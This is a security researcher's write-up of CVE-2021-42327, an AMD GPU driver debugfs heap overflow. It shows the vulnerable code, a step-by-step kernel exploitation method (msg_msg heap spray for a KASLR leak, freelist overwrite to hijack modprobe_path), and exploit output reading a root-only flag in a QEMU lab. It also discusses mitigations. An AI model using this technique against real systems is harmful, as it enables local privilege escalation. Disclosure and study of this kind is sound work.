---
layout: post
title:  CVE-2021-42327 GPU kernel driver SLUB overflow
date:   2021-11-07 18:32:13 -0700
categories: SecurityResearch
---

# Introduction

This bug is kind of useless except if the specific driver is present, the debugfs is enabled, and the debugfs is somehow accessible to non-root users. 
I didn't have the gaming laptop or GPU for this specific driver so I just copied the vulnerable function and function it is used in into QEMU for exploiting.
The vulnerability was introduced somewhere in the Linux Kernel 5.8-rc2 branch and fixed in [5.14.15](https://patchwork.freedesktop.org/patch/461554/?series=96341&rev=2). I found it by auditing the source for a long time and reporting it to AMD. They fixed the bug quickly and found other places it was present. I also reported it to MITRE and they assigned it the CVE.

# Vulnerability

The bug is a simple typo, we all make mistakes and C is unforgiving. Instead of wr_buf_size, size(which is user-controlled) is passed into all of the write functions, allowing SLUB buffer overflow. In the SLUB(Linux kernel's heap), allocations are placed into caches based on size. For example, an allocation between 32 and 64 bytes goes into the kmalloc-64 "slab" or cache and an allocation between 64 and 96 bytes would go into the kmalloc-96 slab. In the driver, there were three basic heap overflows in two in kmalloc-64 buffers and one in a kmalloc-128 buffer.
In dp_phy_test_pattern_debugfs_write
```

uint32_t wr_buf_size = 100;
	long param[11] = {0x0};
	int max_param_num = 11;
......

	wr_buf = kcalloc(wr_buf_size, sizeof(char), GFP_KERNEL);
	if (!wr_buf)
		return -ENOSPC;

	if (parse_write_buffer_into_params(wr_buf, size,
					   (long *)param, buf,
					   max_param_num,
					   &param_nums)) {
```
And then within the parsing function the copy from userspace happens:

```
static int parse_write_buffer_into_params(char *wr_buf, uint32_t wr_buf_size,
					  long *param, const char __user *buf,
					  int max_param_num,
					  uint8_t *param_nums)
{
char *wr_buf_ptr = NULL;
	uint32_t wr_buf_count = 0;
	int r;
	char *sub_str = NULL;
	const char delimiter[3] = {' ', '\n', '\0'};
	uint8_t param_index = 0;

	*param_nums = 0;

	wr_buf_ptr = wr_buf;

	r = copy_from_user(wr_buf_ptr, buf, wr_buf_size);

		/* r is bytes not be copied */
	if (r >= wr_buf_size) {
		DRM_DEBUG_DRIVER("user data not be read\n");
		return -EINVAL;
	}

```

# Mitigations

![mitigation_meme](https://docfate111.github.io/images/mitigation_meme.jpg)

For the exploit I am using the default [KASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), [SMEP](https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/), [SMAP](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention), and [KPTI](https://en.wikipedia.org/wiki/Kernel_page-table_isolation). Enabling SELinux wouldn't affect the exploit but it would actually make it easier since the security pointer in msg_msg can be used for KASLR leak. Enabling FGKASLR also wouldn't affect either exploit since modprobe_path isn't a function and Function Granular KASLR only randomizes the addresses of functions in memory.

# Exploitation

It is pretty vanilla -  there is no amazing new technique.

# Information leak/KASLR bypass
 
Using [elastic objects](https://zplin.me/papers/ELOISE.pdf) you can overwrite the size of the next field so that copy_to_user copies more data to userspace which will leak kernel addresses.
I chose msg_msg(created when message queues - a type of UNIX-like IPC are made) since it is easy to use for heap sprays.

```
struct msg_msg {
	struct list_head m_list; /* next, prev */
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security; /* SELinux pointer null if not enabled */
	/* the actual message follows immediately */
};

```
1. Allocate 3 contiguous msg_msg objects(via msgsnd syscall) and then a subprocess_info struct by socket( socket(22, AF_INET, 0); - creating invalid socket will allocate this struct in the kmalloc-128 cache) 
2. Free the one to replace with the victim since SLUB will usually allocate the next slub at the address the last was freed
3. Trigger the vulnerable function in the driver to overflow the msg_msg object in the adjacent memory chunk.
4. Overwrite the type(to receive messages of the type) and size to be 0x2000 bytes.
5. Call recv_msg COPY_MSG to read the message in place to avoid dereferencing the bad addresses in m_list from when we overwrote the size, as explained [here](https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html)

Awesome now we have some kernel addresses available to userspace. Initially, when I was trying to exploit in kmalloc-64, I was trying to calculate the offset but then when I tried the kmalloc-128 overflow I saw modprobe_path and thought [modprobe_path overwrite](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/) would be easier. 

# Arbitrary write

In my opinion, arbitrary write is more powerful than just overwriting a function pointer on the heap and without the hassle of trying to set up conditions such that the function pointer will run without the other corrupted data in the struct preventing getting to a portion of the code in which the code the function pointer points to would be executed. Also, no need to deal with most of the mitigations.

The SLUB allocates the next chunk based on the freelist pointer which is a pointer to where the next allocation should be.
So we can trick the SLUB to allocate the chunk of memory containing the modprobe_path(path of binary to execute if an invalid script is run) and give
it to the user as a msg_msg in the text section(which is where userspace data will be copied into via msgsnd syscall).

Around kernel version 5.6 the freelist pointer was moved to the middle of the SLUB allocations to prevent single-byte overflow exploits from overwriting it, 
however, since this overflow is an infinite number of bytes it does not affect the exploit.

In order to get the freelist pointer directly after the victim chunk I sprayed a bunch of msg_msg objects(just allocating and freeing a bunch via msgsnd and msgrcv), to clean up the past allocations.

```
/ $ id
uid=1000(ctf) gid=1000 groups=1000
/ $ cat /root/flag
cat: /root/flag: Permission denied
/ $ ls /home/ctf
/ $ ./e
[*] Opened device
[!] Error writing to device
[*] Wrote into freed buffer
  0000  0x0000000000000000    0x4141414141414141    
  0010  0x4141414141414141    0x4141414141414141    
  0020  0x4141414141414141    0x4141414141414141    
  0030  0x4141414141414141    0x4141414141414141    
  0040  0x4141414141414141    0x4141414141414141    
  0050  0x0041414141414141    0xffff88800dd18000    
  0060  0xffff88800dd05ec0    0x0000000000000001    
  0070  0x0000000000000050    0x0000000000000000    
  0080  0x0000000000000000    0x4242424242424242    
  0090  0x4242424242424242    0x4242424242424242    
  00a0  0x4242424242424242    0x4242424242424242    
  00b0  0x4242424242424242    0x4242424242424242    
  00c0  0x4242424242424242    0x4242424242424242    
  00d0  0x0042424242424242    0x0000000000000080    
  00e0  0xffff88800dd91188    0xffff88800dd91188    
  00f0  0xffffffff8107efb0    0x0000000000000000    
  0100  0xffffffff82648920    0xffff88800dd522c0    
  0110  0xffffffff82648840    0xffff88800dd91200   
[*] Modprobe_path: 0xffffffff82648920
[*] Overwriting freelist pointer
[*] Allocating 80 msg_msg
[*] Freeing 80 msg_msg
[!] Error writing to device
/tmp/dummy: line 1: : not found
/ $ ls /home/ctf
flag
/ $ cat /home/ctf/flag
CTF{ONLY_ROOT_CAN_READ_THIS}
```
Cool! Now we can as an unprivileged user run the script(even one that gives a shell) we write in modprobe_path whenever we run a file with an invalid format(for more info read the link for modprobe overwrite). Code for the exploit is [here](https://github.com/docfate111/CVE-2021-42327/blob/main/exploit.c). In this example I wrote /tmp/x to modprobe_path where /tmp/x is a script that changes the permissions of the flag and moves it into /home/ctf from /root.

# Alternative exploit strategies/mitigations

I spent a lot of time trying overflowing kmalloc-64 but I wasn't able to get a reliable kernel address leak. In kmalloc-128 the subprocess_info struct was the obvious choice but I don't know any struct like that for kmalloc-64(if you do contact me please). I was still able to leak kernel addresses they just were at random places all the time. 
In kmalloc-64, this overflow is possible to gain arbitrary write via the same way - overwriting the freelist.
However, if CONFIG_SLAB_FREELIST_HARDENED is enabled for the kernel, user page faulting is required to get a write primitive since the freelist is XORed with random bytes making whatever is overwritten become gibberish. Using userfaultfd, I was [trying](https://github.com/docfate111/CVE-2021-42327/blob/main/exploit_userfaultfd.c) to get an arbitrary write via FizzBuzz's new strategy the [Wall of Perdition](https://syst3mfailure.io/wall-of-perdition). 
However, in kernel version 5.11 userfaultfd by non-privileged users is not allowed by default so it would not work in those versions.
So instead of overwriting some function pointer on the heap(and hoping no other fields are before it) and executing a ROP chain and KPTI trampoline would need to happen instead.
Another way of exploiting is overwriting the freelist pointer's last byte with zero to point to the buffer allocated in the vulnerable function(only would work in the times the last byte of the buffer allocated was zero). Then the attacker could use the use-after-free to get an arbitrary write primitive.
Another mitigation is to prevent modprobe overwrite via enabling CONFIG_STATIC_USERMODEHELPER, the only way I can think of getting around this is the Wall of Perdition strategy again which requires userfaultfd to be available to the unprivileged user.

# Conclusion

I'm a beginner so feel free to email me any tips/criticisms/corrections/questions. My contact info should be below.




